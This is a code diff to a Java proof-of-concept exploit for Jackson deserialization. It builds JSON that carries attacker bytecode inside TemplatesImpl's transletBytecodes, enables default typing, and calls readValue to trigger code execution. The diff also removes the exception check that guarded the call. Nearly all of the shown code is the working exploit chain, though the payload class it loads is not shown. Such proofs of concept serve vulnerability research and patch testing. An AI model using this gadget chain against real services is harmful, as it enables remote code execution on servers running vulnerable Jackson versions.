@@ -5,17 +5,12 @@ package jackson;
  */
 
 import java.io.ByteArrayOutputStream;
+import com.fasterxml.jackson.core.JsonParser;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 
 import com.fasterxml.jackson.databind.*;
-
-
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
 
 import org.apache.commons.io.IOUtils;
 import org.apache.commons.codec.binary.Base64;
@@ -50,31 +45,25 @@ public class Poc {
     public static void main(String args[]) throws Exception
     {
         final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
-        String evilCode = readClass("D:\\quick_response\\marshalsec\\jackson-rce\\target\\classes\\jackson\\Test.class");
+        String evilCode = readClass(System.getProperty("user.dir")+"/target/classes/jackson/Test.class");
         final String JSON = aposToQuotes(
-                "{"
-                        +" 'obj':[ '"+NASTY_CLASS+"',\n"
-                        +"  {\n"
-                        +"    'transletBytecodes' : [ '"+ evilCode +"' ],\n"
-                        +"    'transletName' : 'a.b',\n"
-                        +"    'outputProperties' : { }\n"
-                        +"  }\n"
-                        +" ]\n"
+                        "{\n"
+                        + "'id':123,\n"
+                        + " 'obj':[ '" + NASTY_CLASS + "',\n"
+                        + "  {\n"
+                        + "    'transletBytecodes' : ['" + evilCode + "'],\n"
+                        + "    'transletName':'xiang',\n"
+                        + "    'outputProperties':{ }\n"
+                        + "  }\n"
+                        + " ]\n"
                         +"}"
         );
         System.out.println(JSON);
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
-        try {
+        {
             mapper.readValue(JSON, Bean1599.class);
             System.out.println("Should not pass");
-        } catch (Throwable e) {
-            //verifyException(e, "Illegal type");
-            //verifyException(e, "to deserialize");
-            //verifyException(e, "prevented for security reasons");
-            //BeanDescription desc = e.getBeanDescription();
-            //assertNotNull(desc);
-            //assertEquals(NASTY_CLASS, desc.getBeanClass().getName());
         }
     }
 }
